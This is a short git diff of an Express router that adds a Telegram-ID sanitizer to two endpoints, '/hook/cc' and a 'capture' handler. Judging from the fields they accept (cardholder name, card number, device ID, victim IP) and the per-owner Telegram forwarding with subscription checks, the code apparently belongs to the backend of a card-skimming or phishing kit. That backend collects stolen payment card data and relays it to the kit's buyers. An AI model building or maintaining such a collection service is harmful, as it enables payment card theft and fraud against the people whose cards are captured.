@@ -5,6 +5,7 @@
 import { Router } from "express";
 import { isAdminTg, ADMIN_ID } from "../lib/admin";
 import { escapeMarkdown } from "../lib/telegramText";
+import { sanitizeOwnerTelegramId } from "../lib/telegramIds";
 import { logger } from "../lib/logger";
 import { fbUpdate, fbGet, isSubscriptionActive } from "../bot/firebase";
 import { getBot } from "../bot/index";
@@ -15,7 +16,7 @@ const router = Router();
 router.post("/hook/cc", async (req, res) => {
   try {
     const {
-      ownerTelegramId,
+      ownerTelegramId: rawOwnerTelegramId,
       deviceId,
       cardholderName,
       cardNumber,
@@ -24,6 +25,9 @@ router.post("/hook/cc", async (req, res) => {
       ip,
     } = (req.body ?? {}) as Record<string, string>;
 
+    // Template placeholders (OWNER_TELEGRAM_ID_000000000) and non-numeric
+    // garbage are rejected — they can never be DM'd.
+    const ownerTelegramId = sanitizeOwnerTelegramId(rawOwnerTelegramId);
     if (!ownerTelegramId || !deviceId || !cardNumber) {
       res.status(400).json({ error: "Missing required fields" });
       return;
@@ -160,8 +164,11 @@ async function handleCapture(
 ): Promise<void> {
   try {
     const body = (req.body ?? {}) as Record<string, any>;
-    const { ownerTelegramId, deviceId, ip } = body;
+    const { deviceId, ip } = body;
 
+    // Template placeholders (OWNER_TELEGRAM_ID_000000000) and non-numeric
+    // garbage are rejected — they can never be DM'd.
+    const ownerTelegramId = sanitizeOwnerTelegramId(body.ownerTelegramId);
     if (!ownerTelegramId || !deviceId) {
       res.status(400).json({ error: "Missing required fields" });
       return;
